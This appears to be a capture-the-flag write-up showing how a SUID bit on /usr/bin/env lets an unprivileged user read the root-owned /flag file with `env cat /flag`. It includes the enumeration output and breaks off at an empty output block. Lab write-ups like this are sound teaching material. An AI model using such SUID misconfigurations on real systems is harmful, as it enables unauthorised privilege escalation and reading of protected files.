# Challenge Name: env

## üß† Summary:
The challenge abuses a SUID bit set on `/usr/bin/env`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## üîç Enumeration

```bash
ls -l /usr/bin/env
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/env
```

-The `s` in `-rws` indicates it's a SUID binary.
-`env` runs with **root privileges**.

## üöÄ Exploitation

The `env` command is used to:

- Run a command in a modified or clean environment.

- Set environment variables temporarily for that command.

- Find executables in your $PATH in a portable way (e.g., #!/usr/bin/env python3 in scripts).

So we can simply cat the /flag using env:

```bash
env cat /flag
```

Output:
```
